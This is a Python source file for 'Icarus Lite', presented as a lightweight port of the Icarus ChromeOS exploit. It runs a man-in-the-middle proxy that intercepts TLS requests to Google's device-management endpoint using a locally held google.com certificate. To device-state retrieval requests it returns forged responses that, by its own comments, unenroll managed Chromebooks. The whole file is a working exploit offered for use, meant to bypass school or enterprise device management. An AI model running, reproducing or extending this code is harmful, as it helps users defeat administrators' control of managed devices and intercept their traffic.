"""
Icarus Lite v1.0
Written by cosmicdevv

Description:
Icarus Lite is a simple and lightweight version of the Icarus ChromeOS exploit initially written in NodeJS by Writable/Unretained/MunyDev.

The goal of Icarus Lite is to simplify the codebase and make it easier to understand and modify. Icarus Lite is

How Icarus/Icarus Lite work:
ill write later lol

"""

import os
import time
import socket
import ssl
import shutil
import threading
import select
import re
import requests
import http.server
import urllib.request
import urllib.parse
from dmbackend import device_management_pb2

pInitial = 3001 # The port that MiniServers will start up from.
certPaths = {} # Stores paths of certificates on the local filesystem

# Custom function to print text with color to enhance user experience while reducing dependies (such as Colorama) that are needed
def colorprint(text, color):
    if color == "blue":
        print(f"\033[34m{text}\033[0m")
    elif color == "green":
        print(f"\033[32m{text}\033[0m")
    elif color == "red":
        print(f"\033[31m{text}\033[0m")

# unlike normal icarus which calls other files and shit to create a miniserver, we can do it easily in icarus Lite!!!!!
class MiniServerHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass # Since we have our own logging, we don't need the HTTP server to log requests it recieves

    def do_GET(self):
        colorprint("GET request recieved, ignoring.\n\n", "blue")
        self.send_response(200)
        self.wfile.write(b"OK")

    def do_POST(self):
        # Slightly rewritten part of dmbackend
        # Get the body content of the request from the client
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        # Create a dmr object
        dmr = device_management_pb2.DeviceManagementRequest()
        dmr.ParseFromString(body)
        # Declare status_code and resp which are used for the response later.
        status_code = 0
        resp = None
        # all the magic originally by writable
        if (dmr.HasField("device_state_retrieval_request")):
            status_code = 200
            resp = device_management_pb2.DeviceManagementResponse()
            rr = resp.device_state_retrieval_response
            dv = device_management_pb2.DeviceInitialEnrollmentStateResponse()
            dv.Clear()
            dv = rr.initial_state_response
            dv.initial_enrollment_mode = 0
            dv.management_domain = ""
            dv.is_license_packaged_with_device = False
            dv.disabled_state.message = ""
            rr.restore_mode = 0
            rr.management_domain = ""
            print(dmr)
        else:
            con = requests.post("https://m.google.com/devicemanagement/data/api?" + urllib.parse.urlparse(self.path).query, data=body, headers=dict(self.headers))
            status_code = con.status_code
            resp = device_management_pb2.DeviceManagementResponse()
            resp.ParseFromString(con.content)
            print(con)
        # Send the response back to the client, which unenroll the device
        self.send_response(status_code)
        self.send_header("Content-Type", "application/x-protobuffer")
        self.send_header("Content-Length", str(len(resp.SerializeToString())))
        self.end_headers()
        self.wfile.write(resp.SerializeToString())
        colorprint("Successfully intercepted request.\n\n", "green")


class MiniServer:
    def __init__(self):
        # Create a mini HTTP/HTTPS server.
        global pInitial
        self.port = pInitial
        handler = MiniServerHandler
        handler.server = self
        # Keep trying to create the server in case some ports are already in use, in which case the code will increment the port and try again.
        while True:
            try:
                self.httpd = http.server.HTTPServer(("0.0.0.0", self.port), handler)
                break
            except OSError:
                pInitial += 1
                self.port = pInitial
                continue
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile="./certs/google.com.pem", keyfile="./certs/google.com.key")
        self.httpd.socket = context.wrap_socket(self.httpd.socket, server_side=True)
        pInitial += 1
        threading.Thread(target=self.httpd.serve_forever).start() # Start the server in a separate thread so it doesn't block the main thread.
        

def handle_client(client_socket, address):
    # Initial request buffer
    colorprint("// HANDLING REQUEST \\\\", "blue")
    host = None
    port = 0
    is_tls = False
    is_filtered = False
    request = b""
    
    # Gets all the request data (we while loop this incase the request is larger than 1 packet, and the loop ends once the end of the request is reached)
    while b"\r\n\r\n" not in request:
        data = client_socket.recv(4096) # Recieve 1 packet with the buffer size of 4096 bytes
        request += data # Add the newly retrieved data to the stored request data

    # Split and decode the request data
    request_line = request.split(b"\r\n")[0].decode("utf-8")
    if request_line.startswith("CONNECT"): # CONNECT means it's a TLS request
        is_tls = True
        _, target, _ = request_line.split(" ", 2)
        host, port = target.split(":", 1)
        port = int(port)
    else: # If CONNECT isn't in the request_line, it's not a TLS request, and we handle it differently
        is_tls = False
        method, path, _ = request_line.split(" ", 2)
        # Get the host from the request data
        for line in request.split(b"\r\n")[1:]:
            if line.startswith(b"Host: "):
                host = line[6:].decode("utf-8")
                break
        # If a host isn't found, the request is probably malformed
        if not host:
            client_socket.close()
            return
        # If the host specifies a port to use, we'll retrieve it.
        if ":" in host:
            host, port = host.split(":", 1)
            port = int(port) # Ensure the host is an integer and not a string
        else: # If no port is specified, we'll use the default port for a non-TLS request (which is 80)
            port = 80 

    # Check if the host is filtered
    if re.match(r"m\.google\.com", host):
        is_filtered = True

    # Console logging
    colorprint("Server Address: " + str(host), "blue")
    colorprint("Is TLS (HTTPS) connection: " + str(is_tls), "green" if is_tls else "red")
    colorprint("Is filtered? " + str(is_filtered), "green" if is_filtered else "red")

    # If it's filtered and it's a TLS request, we'll have to send the request to our own server so we can intercept it
    if is_filtered and is_tls:
        # Create a new MiniServer, 
        miniserver = MiniServer()
        # Create a server socket to communicate with the Miniserver
        miniserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        miniserver_socket.connect(("127.0.0.1", miniserver.port)) 
        # Acknowledge the request, then pipe the client to the MiniServer
        client_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        try:
            pipe = tunnel_traffic(client_socket, miniserver_socket)
            # If tunnel closed on first packet (client likely rejected connection)
            if not pipe:
                colorprint("ERROR: The client may have rejected the connection. This is usually an SSL issue.", "red")
        except Exception as e:
            colorprint(f"ERROR: {e}\nThe client may have rejected the connection.", "red")
            colorprint("Have you ran the Icarus shim on the target Chromebook?", "blue")
        return
    # The below only runs if the host isn't filtered (or it is filtered but not a TLS request, in which case we won't intercept it)
    try:
        # Create a connection to the host server
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.connect((host, port))
        if is_tls:
            # If it's a TLS request, we'll acknowledge the request so the tunnel between the client and server can be established shortly
            client_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        else:
            # If it's not a TLS request, we'll forward all the data from the client to the server
            server_socket.sendall(request)
        # Same as .pipe() in NodeJS but we have to do it a bit differently.
        try:
            pipe = tunnel_traffic(client_socket, server_socket)
        except Exception as e:
            colorprint(f"ERROR: {e}\nUnknown failure tunneling traffic.", "red")
    except Exception as e:
        colorprint(f"Error connecting to {host}:{port} - {e}", "red")
        client_socket.close()
        return
    print("\n\n") # New lines for next request

def tunnel_traffic(client_socket, server_socket):
    # Because Python does not have a built-in .pipe() method like NodeJS, we have to do this manually.
    client_socket.setblocking(0)
    server_socket.setblocking(0)
    while True:
        readable, _, exceptional = select.select([client_socket, server_socket], [], [client_socket, server_socket], 60)
        if exceptional:
            break
        for sock in readable:
            peer_sock = server_socket if sock is client_socket else client_socket
            # normally we'd put a try catch exception here but i want it to raise an error when there is one
            data = sock.recv(4096)
            if not data:
                # If it's the first packet or something, return False for error handling purposes
                if readable.index(sock) == 0:
                    return False
                return True
            first = False
            peer_sock.sendall(data)
    client_socket.close()
    server_socket.close()

colorprint("Icarus Lite v1.0", "blue")
colorprint("Written by cosmicdevv", "blue")
colorprint("Improved by kxtzownsu", "blue")

port = 8126
proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
proxy_socket.bind(("0.0.0.0", port))
proxy_socket.listen(100)

# Get the local IP for the user
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 1))
local_ip = s.getsockname()[0]
s.close()

colorprint(f"Icarus Lite is running on: {local_ip}:{port}", "green")
while True:
    try:
        client_socket, client_address = proxy_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.daemon = True
        client_thread.start()
    except KeyboardInterrupt:
        print("Icarus Lite is shutting down...")
        proxy_socket.close()
        break
    except Exception as e:
        print(f"Error accepting connection: {e}")
proxy_socket.close()
